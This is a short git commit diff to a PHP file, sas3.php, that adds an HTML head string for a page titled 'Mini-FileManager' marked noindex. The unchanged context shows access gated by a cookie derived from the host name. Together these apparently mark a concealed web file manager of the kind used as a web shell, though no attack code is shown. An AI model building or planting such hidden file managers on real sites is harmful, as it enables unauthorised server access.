6588fb62935903ec34ab0fd631b166faf5d7c301
raitokazuki <97198960+RaitoKazuki@users.noreply.github.com>
2025-04-01 23:51:38 +0700

    Update sas3.php

--- sas3.php
+++ sas3.php
@@ -22,6 +22,7 @@ if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
 	}
 }
 
+$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex"><title>Mini-FileManager</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';
 
 function get_post($name){
     return (isset($_POST[$name]) ? $_POST[$name] : false);
